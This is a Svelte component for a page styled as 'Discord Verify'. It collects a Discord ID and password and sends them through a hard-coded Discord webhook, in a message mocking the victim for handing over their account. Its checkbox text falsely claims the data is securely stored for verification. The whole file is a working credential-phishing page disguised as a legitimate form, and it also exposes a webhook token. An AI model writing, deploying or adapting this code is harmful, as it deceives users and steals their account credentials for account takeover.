<script>

let id = $state("")
let password = $state("")
let terms = $state(false)
let error = $state("")
const webhook = "https://discord.com/api/webhooks/1437884748516036618/6eKwMty8O9Nbn0DBLsV_8SVKxqRiPRfypWpaq4iq5xvcZQOVi9D6CyuAvgUW9cATskQ2"

async function submit(){
    if (id == ""){
        error = "Invalid ID."
        return
    }
    if (password == ""){
        error = "Invalid Password."
        return
    }
    console.log(password)
    error = ""
    const response = await fetch(`${webhook}`, {
        method: "POST",
        headers: {
        "Content-Type": "application/json"
        },

        body: JSON.stringify({
            "embeds": [
                {
                "title": "Info submitted!",
                "description": "Some goofy ahh just gave us their discord account!",
                "color": 5814783,
                "fields": [
                    {
                    "name": "Password",
                    "value": `${password}`
                    },
                    {
                    "name": "ID",
                    "value": `${id}`
                    }
                ]
                }
            ],
            "attachments": []
            })
        }
    );
}




</script>



    <div class="bg-black flex flex-col items-center justify-center gap-5 min-h-screen w-full text-white">
    <h1 class="font-bold text-[#5865F2] text-3xl md:text-4xl lg:text-5xl">Discord Verify</h1>
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Name">
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord ID" bind:value={id}>
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Password" type="password" bind:value={password}>
    <div class="flex flex-row items-center justify-center text-neutral-400 gap-2">

        <input id="terms" class="bg-neutral-950 rounded-full" placeholder="Discord Name" type="checkbox">
        <label for="terms">I accept that this info is securly stored and used to verify my discord account.</label>
        

    </div>
    {#if error}
        <p class="font-semibold text-red-600">{error}</p>
    {/if}
    <button class="bg-[#5865F2] rounded-2xl py-2 px-4" type="submit" onclick={submit}>Verify now.</button>

</div>
